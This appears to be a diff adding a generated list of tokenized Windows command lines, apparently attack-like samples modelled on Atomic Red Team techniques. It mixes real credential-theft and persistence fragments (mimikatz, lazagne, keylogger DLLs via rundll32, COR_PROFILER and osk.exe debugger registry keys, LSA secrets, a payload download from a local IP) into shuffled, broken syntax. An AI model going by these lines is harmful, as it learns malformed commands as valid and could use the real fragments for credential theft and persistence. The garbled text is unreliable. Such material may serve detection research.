@@ -1,0 +1,64 @@
+get-localgroupmember -group `` administrators '' /t reg_sz /f file -name administrators '' '' -name administrators ''
+rdrleakdiag.exe /p -o `` $ target t1547.009 . c : cor_profiler = keylog
+get-ciminstance -classname win32_processor | \microsoft\teams\current\teams.exe
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+tasklist
+ren $ consumerargs
+get-wmiobject win32_group
+iediagcmd.exe -o $ { http : \users\
+iediagcmd.exe /out '' $ $ { user_name }
+fsutil.exe trace decode
+quser
+add-localgroupmember -group `` hklm\software\microsoft\windows nt\currentversion\windows '' '' /v `` cor_profiler '' '' -name $ '' ;
+winrar :logonpasswords
+net localgroup administrators '' /f
+$ shortcut = `` set-wmiinstance file administrators '' c administrators '' '' c : cor_profiler name = administrators '' '' -name threadingmodel '' '' ;
+tree
+net localgroup `` lsadbextpt
+iediagcmd.exe /out : $ { filename_regex }
+iediagcmd.exe /out $ { shadow http : set-wmiinstance -namespace hkey_local_machine\software\microsoft\windows file execution file lsass ) ; querylanguage= querylanguage= $ consumerargs = @ : software\classes\clsid = administrators '' $ { timeout } -t $ filter = cor_profiler = administrators } , administrators '' file administrators ''
+bitsadmin.exe /create $ `` domain
+nmap -o $ administrators '' $ { user_name } in $ { command }
+nmap -o $ : windir volumn name name \system32\osk.exe
+rundll32 keylogger_dll_invisible.dll , keylog
+rundll32 popcalc.dll , keylog
+net localgroup administrators `` cor_profiler '' /f
+quser
+net group `` domain c : t1547.009 volumn -o admins '' $ hkey_local_machine\software\microsoft\windows c administrators '' '' -name `` cor_profiler '' ;
+vssadmin create shadow foreach-object ( new-object hklm\security\policy\secrets % temp % \system32\osk.exe
+subfinder -d 1 volumn -o
+if ( set-wmiinstance -namespace hklm : cor_profiler /grant [ text.encoding ] : installscreensaver $ execution options\osk.exe '' disable
+ipconfig
+namp -sn -l @ '' '' t1547.009 account `` components\atomic_test '' -name `` cor_profiler = $ '' -name debugger true
+rundll32 popcalc.dll , keylog
+iediagcmd.exe /out '' @ $ { '' % \system32\osk.exe
+microsoft.nodejstools.pressanykey.exe normal 1 $ { executable_binary } /f
+ffuf -w } -l $ target $ target t1547.009 . = `` $ '' \programdata\microsoft\windows\start \programdata\microsoft\windows\start panel\desktop '' ;
+temp '' :minidump c : set-wmiinstance -namespace a c : \windows\system32\desk.cpl , http http http : 'https http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+wt.exe
+net localgroup `` administrators '' /t cor_profiler ''
+netstat
+copy c : \software\microsoft\command appdata % \microsoft\teams\current\teams.exe
+lazagne.exe windows
+net localgroup `` administrators '' '' '' -name `` cor_profiler '' ''
+quser
+del % \system32\osk.exe /grant administrators '' -name $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ''
+$ shortcut = `` $ ( = `` cor_profiler = '' '' c '' c : cor_profiler '' $ threadingmodel '' '' -name $ true
+net localgroup administrators `` '' '' '' /y '' /f
+powershell -executionpolicy bypass
+nbtstat -n
+reg query
+cscript $ shortcut ;
+rdrleakdiag.exe /p $ target '' t1547.009 . ) t1547.009 ; querylanguage= target '' $ target $ `` `` 7 \users\ ''
+rdrleakdiag.exe -sn -o $ i /user : cor_profiler = `` '' '' file '' -name administrators '' '' -name autorun '' -name threadingmodel -- # true
+reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /t -name `` threadingmodel '' ;
+powershell -executionpolicy bypass -command $ : cor_profiler '' -name administrators ''
+reg `` hklm\software\microsoft\windows nt\currentversion\windows `` cor_profiler '' '' reg_dword /d 1
+net localgroup `` administrators '' /f
+remove-item -path $ target t1547.009 @ software\classes\clsid\ shell = `` cor_profiler = cor_profiler = administrators '' ''
+lazagne.exe windows
+net localgroup `` hklm\system\currentcontrolset\control\session /y c `` : cor_profiler '' /t administrators '' ''
+invoke-mimikatz.exe
+remove-item -path $ target t1547.009 wevtutil hklm\systyem name = % \system32\osk.exe
+ren $ { filename_regex }
+copy admins `` .\lazagne os ; off
